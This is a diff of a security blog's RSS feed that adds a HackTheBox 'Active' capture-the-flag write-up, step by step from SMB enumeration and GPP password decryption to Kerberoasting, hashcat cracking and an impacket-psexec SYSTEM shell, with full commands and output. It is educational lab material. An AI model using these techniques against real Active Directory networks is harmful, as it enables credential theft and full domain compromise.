@@ -5,7 +5,286 @@
     <link>https://fahmifj.github.io/tags/oscp-like/</link>
     <description>Recent content in OSCP-like on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Tue, 13 Jul 2021 11:30:31 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/oscp-like/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 15 Jul 2021 13:17:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/oscp-like/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Active</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-active/</link>
+      <pubDate>Thu, 15 Jul 2021 13:17:29 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-active/</guid>
+      <description>Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.</description>
+      <content:encoded><![CDATA[<p>Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Active Directory GPP</li>
+<li>Kerberoasting</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Impacket</li>
+<li>CrackMapExec</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan (after  <code>-p-</code> performed) discovers a bunch of open ports. The most notables ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can safely assume this is an Active Directory (as the box name implies).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-10 23:20 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.100
+Host is up <span style="color:#f92672">(</span>0.072s latency<span style="color:#f92672">)</span>.
+
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2021-07-11 03:20:53Z<span style="color:#f92672">)</span>
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open   ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp   open   microsoft-ds?
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp  open   tcpwrapped
+4915/tcp  closed frcs
+5722/tcp  open   msrpc         Microsoft Windows RPC
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open   msrpc         Microsoft Windows RPC
+49153/tcp open   msrpc         Microsoft Windows RPC
+49154/tcp open   msrpc         Microsoft Windows RPC
+49155/tcp open   msrpc         Microsoft Windows RPC
+49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49169/tcp open   msrpc         Microsoft Windows RPC
+49172/tcp open   msrpc         Microsoft Windows RPC
+49180/tcp open   msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 4s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-07-11T03:21:48
+|_  start_date: 2021-07-09T05:18:19
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 71.11 seconds
+</code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) as well as PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I&rsquo;ll consider these vulns as alternative methods and put them in separate post.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-53---dns">TCP 53 - DNS</h3>
+<p>There is no zone transfer in this machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ dig axfr @10.10.10.100 10.10.10.100
+
+; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.100 10.10.10.100
+; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+;; global options: +cmd
+; Transfer failed.
+</code></pre></div><h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
+<p><code> smbmap</code> identifies that anonymous logon is allowed and it has read access on  <code>Replication</code> share.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ smbmap -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -H 10.10.10.100
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.100:445        Name: active.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   NO ACCESS
+</code></pre></div><h4 id="replication-share">Replication Share</h4>
+<p>The <code>Replication</code> share contains a lot of folders, so I&rsquo;ll just download them recursively.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ smbclient -N //10.10.10.100/Replication
+Anonymous login successful
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+  active.htb                          D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+
+                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5722238</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> recurse on
+smb: <span style="color:#ae81ff">\&gt;</span> prompt of
+smb: <span style="color:#ae81ff">\&gt;</span> mget * 
+getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>PT.INI of size <span style="color:#ae81ff">23</span> as active.htb/Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/GPT.INI <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><p>The only interesting file there is the <code>Groups.xml</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ find . -type f -iname groups.xml                                                                            
+./Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Preferences/Groups/Groups.xml
+</code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <code>active.htb\SVC_TGS</code>, and I&rsquo;ll note them,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ cat ./Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Preferences/Groups/Groups.xml
+&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>?&gt;
+&lt;Groups clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span> image<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span> changed<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2018-07-18 20:46:06&#34;</span> uid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;U&#34;</span> newName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> fullName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> cpassword<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> changeLogon<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> noChange<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> neverExpires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> acctDisabled<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> userName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83»  
+$ ldapsearch -LLL -x -h 10.10.10.100 -s base namingContexts 
+dn:
+namingContexts: DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+namingContexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+namingContexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+namingContexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+namingContexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.75» 
+$ ldapsearch -LLL -x -h 10.10.10.100 -b <span style="color:#e6db74">&#34;dc=active,dc=htb&#34;</span> 
+Operations error <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="access-as-svc_tgs">Access as SVC_TGS</h3>
+<h4 id="group-policy-preferences-gpp---password-decrypt">Group Policy Preferences (GPP) - Password Decrypt</h4>
+<p>In Windows Server 2008, Microsoft introduced a feature called <strong>Group Policy Preferences</strong>. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers. When a GPP is created, it also creates an associated XML file in SYSVOL share. Some of the XML files created contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> which can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p>
+<p>Kali comes with a tool called <code>gpp-decrypt</code>, and this tool can be used to decrypt the <code>cpassword</code> I obtained from the <code>Groups.xml</code> file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
+GPPstillStandingStrong2k18
+</code></pre></div><h4 id="users-share">Users Share</h4>
+<p><code>CrackMapExec</code> confirms that the credentials (<code>SVC_TGS:GPPstillStandingStrong2k18</code>) are valid. I have read access now on the three other shares.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ crackmapexec smb active.htb -u <span style="color:#e6db74">&#39;SVC_TGS&#39;</span> -p <span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> --shares
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 6.1 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:active.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> active.htb<span style="color:#ae81ff">\S</span>VC_TGS:GPPstillStandingStrong2k18 
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               Share           Permissions     Remark
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               -----           -----------     ------
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               C$                              Default share
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               IPC$                            Remote IPC
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               Replication     READ            
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               Users           READ  
+</code></pre></div><p>Looking into the  <code>Users</code> share, I&rsquo;m sure this share is most likely <code>C:\Users\</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ smbclient -N //10.10.10.100/Users -U <span style="color:#e6db74">&#39;SVC_TGS%GPPstillStandingStrong2k18&#39;</span>
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                  DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+  ..                                 DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+  Administrator                       D        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">16</span> 06:14:21 <span style="color:#ae81ff">2018</span>
+  All Users                       DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+  Default                           DHR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 02:38:21 <span style="color:#ae81ff">2009</span>
+  Default User                    DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+  desktop.ini                       AHS      <span style="color:#ae81ff">174</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+  Public                             DR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+  SVC_TGS                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>
+
+                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5722238</span> blocks available
+</code></pre></div><p>And there is a user flag in <code>SVC_TGS\Desktop</code>. I can read the flag with <code>more</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">smb: \&gt; ls SVC_TGS\Desktop\
+  .                                   D        0  Sat Jul 21 11:14:42 2018
+  ..                                  D        0  Sat Jul 21 11:14:42 2018
+  user.txt                            A       34  Sat Jul 21 11:06:25 2018
+
+                10459647 blocks of size 4096. 5722238 blocks available
+smb: \&gt; more SVC_TGS\Desktop\user.txt
+getting file \SVC_TGS\Desktop\user.txt of size 34 as /tmp/smbmore.uhunaP (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+</code></pre></div><p><img class="img-container" src="imgs/image-20210711104959070.png" alt="image-20210711104959070"  />
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
+<h4 id="ldap---spn-enumeration">LDAP - SPN enumeration</h4>
+<p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service.</p>
+<p>It was found that the administrator has <code>servicePrincipalName</code> attribute.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ ldapsearch -LLL -x -D <span style="color:#e6db74">&#39;SVC_TGS@active.htb&#39;</span> -w <span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> -h 10.10.10.100 -b <span style="color:#e6db74">&#34;dc=active,dc=htb&#34;</span> <span style="color:#e6db74">&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span> 
+dn: CN<span style="color:#f92672">=</span>Administrator,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+adminCount: <span style="color:#ae81ff">1</span>
+accountExpires: <span style="color:#ae81ff">0</span>
+logonCount: <span style="color:#ae81ff">34</span>
+sAMAccountName: Administrator
+sAMAccountType: <span style="color:#ae81ff">805306368</span>
+servicePrincipalName: active/CIFS:445
+objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h4 id="kerberoasting">Kerberoasting</h4>
+<p><strong>Kerberoasting</strong> is an attack against Kerberos to steal a Service Ticket. The attack is well explained in <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">this blog</a> and <a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">this one</a>.</p>
+<p>The following image created by <a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">David Freimannis</a> shows an overview of Kerberos authentication process. The red box indicates the <strong>Kerberoasting</strong> attack.</p>
+<p><img class="img-container" src="imgs/image-20210715120848088.png" alt="image-20210715120848088"  title="Kerberos Mechanism"  />
+</p>
+<center><small>Taken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis</small></center>
+<p>In the image above, step number 4, the client/user will obtains a Ticket Granting Service (TGS) ticket. This ticket is encrypted with NTLM hash (derived from password) of a service account. If the client itself has been compromised, an attacker could easily steal the ticket and attempt an offline brute-force to recover the password from the ticket.</p>
+<p>For example, let&rsquo;s start from step 3 and say we want to access a CIFS service. The server (KDC) then searches for SPN of CIFS service, which in this case is <code>active/CIFS:445</code> and <strong>it is tied</strong> to the Administrator account. Once the SPN is found, server will issue a TGS ticket encrypted with NTLM hash of the Administrator account and send the ticket to the client. Now that we have the TGS ticket, but instead of using the ticket to authenticate to the CIFS service, we keep that ticket and attempt a brute-force against it to obtain the administrator password.</p>
+<blockquote>
+<p>If the SPN is tied to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.</p>
+</blockquote>
+<p>There are several tools out there that can be used to perform a Kerberoasting attack, but I&rsquo;ll the one from Impacket called <code>Impacket-GetUserSPNs</code>. The tools captures the ticket and automatically formats it into hashcat crackable format.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.75» 
+$ impacket-GetUserSPNs active.htb/SVC_TGS:<span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> -dc-ip 10.10.10.100 -request-user administrator
+Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN<span style="color:#f92672">=</span>Group Policy Creator Owners,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb  2018-07-18 15:06:40.351723  2021-07-14 12:36:18.277545             
+
+
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$92c75d0a49cbaf166e656a7350827d0c$a775e30...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h4 id="tgs-crack">TGS Crack</h4>
+<p>The password of the TGS can be recovered using hashcat.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span style="color:#ae81ff">13100</span> hashes/svc_tgs.krbhash ../../rockyou.txt -O
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$92c75d0a49cbaf166e656a7350827d0c$a775e30...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...:Ticketmaster1968
+</code></pre></div><p>It is  <code>Ticketmaster1968</code>.</p>
+<h4 id="impacket-psexec">Impacket-psexec</h4>
+<p>Using the administrator account along with the obtained password, I&rsquo;m able to get a shell as local system using <code>impacket-psexec</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
+$ impacket-psexec active.htb/administrator:<span style="color:#e6db74">&#39;Ticketmaster1968&#39;</span>@10.10.10.100
+Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.10.10.100.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file olAAJsqj.exe
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.10.10.100.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service mvjR on 10.10.10.100.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service mvjR.....
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami <span style="color:#f92672">&amp;&amp;</span> ipconfig
+nt authority<span style="color:#ae81ff">\s</span>ystem
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.10.100
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+
+Tunnel adapter isatap.<span style="color:#f92672">{</span>B3FEC2C7-47CA-4014-A441-A3A5CDDC983C<span style="color:#f92672">}</span>:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+</code></pre></div><p>The root flag is done here.</p>
+<pre><code>C:\Windows\system32&gt;type \Users\Administrator\Desktop\root.txt
+b5fc76...[SNIP]...
+</code></pre><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></li>
+<li><a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting">https://hebo.gitbook.io/hackbook/active-directory/kerberoasting</a></li>
+<li><a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/</a></li>
+<li><a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Shocker</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
@@ -1236,382 +1515,6 @@ If you enjoyed this CTF, send me a tweet via @DCAU7.
 <ul>
 <li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
 <li><a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Time</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-time/</link>
-      <pubDate>Sun, 09 May 2021 05:43:58 +0700</pubDate>
-      
